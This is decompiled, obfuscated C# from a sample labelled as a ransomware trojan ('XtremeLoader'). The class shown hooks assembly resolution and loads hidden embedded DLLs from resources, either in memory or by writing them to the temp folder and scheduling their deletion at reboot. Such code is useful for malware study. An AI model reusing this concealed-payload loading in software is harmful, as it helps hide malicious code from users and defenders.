// Decompiled with JetBrains decompiler
// Type: #g.#t
// Assembly: XtremeLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FF5C2739-BB51-401B-85EA-0335ADE5C685
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00029-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b5719a19c3ed14c00bfb3e5988b7b89e7ee38b7d440428aecb385b12d2f2abd5.exe

using \u0023g;
using \u0023V;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0023g
{
  internal sealed class \u0023t
  {
    internal const string \u0023h = "{71461f04-2faa-4bb9-a0dd-28a79101b599}";
    private const int \u0023i = 4;
    private static Hashtable \u0023j = new Hashtable();

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    private static extern bool \u0023k(string _param0, string _param1, int _param2);

    internal static bool IsWebApplication
    {
      get
      {
        try
        {
          string lower = Process.GetCurrentProcess().MainModule.ModuleName.ToLower();
          if (lower == "w3wp.exe")
            return true;
          if (lower == "aspnet_wp.exe")
            return true;
        }
        catch
        {
        }
        return false;
      }
    }

    internal static void \u0023p()
    {
      try
      {
        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0023t.\u0023q);
      }
      catch
      {
      }
    }

    internal static Assembly \u0023q(object _param0, ResolveEventArgs _param1)
    {
      \u0023t.\u0023A a = new \u0023t.\u0023A(_param1.Name);
      string base64String1 = Convert.ToBase64String(Encoding.UTF8.GetBytes(a.\u0023y(false)));
      string[] strArray = "ezIwYmE3MjQyLWI4NzAtNGFmMy1hZjhkLTU5NWE1ZmQwZDQ5Nn0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{7e8ee0be-16ab-4d69-a3be-c864f7777ec9},ezIwYmE3MjQyLWI4NzAtNGFmMy1hZjhkLTU5NWE1ZmQwZDQ5Nn0=,[z]{7e8ee0be-16ab-4d69-a3be-c864f7777ec9}".Split(',');
      string str1 = string.Empty;
      bool flag1 = false;
      bool flag2 = false;
      for (int index = 0; index < strArray.Length - 1; index += 2)
      {
        if (strArray[index] == base64String1)
        {
          str1 = strArray[index + 1];
          break;
        }
      }
      if (str1.Length == 0 && a.\u0023x.Length == 0)
      {
        string base64String2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(a.\u0023u));
        for (int index = 0; index < strArray.Length - 1; index += 2)
        {
          if (strArray[index] == base64String2)
          {
            str1 = strArray[index + 1];
            break;
          }
        }
      }
      if (str1.Length > 0)
      {
        if (str1[0] == '[')
        {
          int num = str1.IndexOf(']');
          string str2 = str1.Substring(1, num - 1);
          flag1 = str2.IndexOf('z') >= 0;
          flag2 = str2.IndexOf('t') >= 0;
          str1 = str1.Substring(num + 1);
        }
        lock (\u0023t.\u0023j)
        {
          if (\u0023t.\u0023j.ContainsKey((object) str1))
            return (Assembly) \u0023t.\u0023j[(object) str1];
          Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str1);
          if (manifestResourceStream != null)
          {
            int length = (int) manifestResourceStream.Length;
            byte[] numArray = new byte[length];
            manifestResourceStream.Read(numArray, 0, length);
            if (flag1)
              numArray = \u00232.\u00231(numArray);
            Assembly assembly = (Assembly) null;
            if (!flag2)
            {
              try
              {
                assembly = Assembly.Load(numArray);
              }
              catch (FileLoadException ex)
              {
                flag2 = true;
              }
              catch (BadImageFormatException ex)
              {
                flag2 = true;
              }
            }
            if (flag2)
            {
              try
              {
                string path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str1);
                Directory.CreateDirectory(path1);
                string path2 = path1 + a.\u0023u + ".dll";
                if (!File.Exists(path2))
                {
                  FileStream fileStream = File.OpenWrite(path2);
                  fileStream.Write(numArray, 0, numArray.Length);
                  fileStream.Close();
                  \u0023t.\u0023k(path2, (string) null, 4);
                  \u0023t.\u0023k(path1, (string) null, 4);
                }
                assembly = Assembly.LoadFile(path2);
              }
              catch
              {
              }
            }
            \u0023t.\u0023j[(object) str1] = (object) assembly;
            return assembly;
          }
        }
      }
      return (Assembly) null;
    }

    internal struct \u0023A
    {
      public string \u0023u;
      public Version \u0023v;
      public string \u0023w;
      public string \u0023x;

      public string \u0023y(bool _param1)
      {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append(this.\u0023u);
        if (_param1 && this.\u0023v != (Version) null)
        {
          stringBuilder.Append(", Version=");
          stringBuilder.Append((object) this.\u0023v);
        }
        stringBuilder.Append(", Culture=");
        stringBuilder.Append(this.\u0023w.Length == 0 ? "neutral" : this.\u0023w);
        stringBuilder.Append(", PublicKeyToken=");
        stringBuilder.Append(this.\u0023x.Length == 0 ? "null" : this.\u0023x);
        return stringBuilder.ToString();
      }

      public \u0023A(string assemblyFullName)
      {
        this.\u0023v = (Version) null;
        this.\u0023w = string.Empty;
        this.\u0023x = string.Empty;
        this.\u0023u = string.Empty;
        string str1 = assemblyFullName;
        char[] chArray = new char[1]{ ',' };
        foreach (string str2 in str1.Split(chArray))
        {
          string str3 = str2.Trim();
          if (str3.StartsWith("Version="))
            this.\u0023v = new Version(str3.Substring(8));
          else if (str3.StartsWith("Culture="))
          {
            this.\u0023w = str3.Substring(8);
            if (this.\u0023w == "neutral")
              this.\u0023w = string.Empty;
          }
          else if (str3.StartsWith("PublicKeyToken="))
          {
            this.\u0023x = str3.Substring(15);
            if (this.\u0023x == "null")
              this.\u0023x = string.Empty;
          }
          else
            this.\u0023u = str3;
        }
      }
    }
  }
}
